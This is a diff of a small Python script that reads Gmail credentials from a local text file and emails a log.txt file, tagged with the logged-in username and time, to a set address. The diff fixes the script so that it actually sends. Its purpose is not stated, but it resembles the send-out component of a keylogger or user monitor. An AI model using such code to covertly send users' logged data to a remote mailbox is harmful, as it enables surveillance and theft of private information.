@@ -8,14 +8,17 @@ from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 
 username = os.getlogin()
-server = smtplib.SMTP('smtp.gmail.com', 25)
+server = smtplib.SMTP('smtp.gmail.com', 587)
 
 server.ehlo()
+server.starttls()
+server.ehlo()
 
-with open('password.txt', 'r') as f:
-    email = f.readlines()[0]
-    password = f.readlines()[1]
-    to = f.readlines()[2]
+with open('e:\src\password.txt', 'r') as f:
+    file = f.readlines()
+    email = file[0]
+    password = file[1]
+    to = file[2]
 
 server.login(email, password)
 current_time = datetime.datetime.now()
@@ -25,7 +28,7 @@ msg['From'] = f'{username}-Logs'
 msg['To'] = to
 msg['Subject'] = f'Logging-{username}: {current_time}'
 
-filename = 'log.txt'
+filename = 'e:\src\log.txt'
 attachment = open(filename, 'rb')
 
 p = MIMEBase('application', 'octet-stream')
@@ -36,4 +39,5 @@ p.add_header('Content-Disposition', f'attachement; filename={filename}')
 msg.attach(p)
 
 text = msg.as_string()
-server.sendmail(email, to, msg)
+server.sendmail(email, to, text)
+print('done')
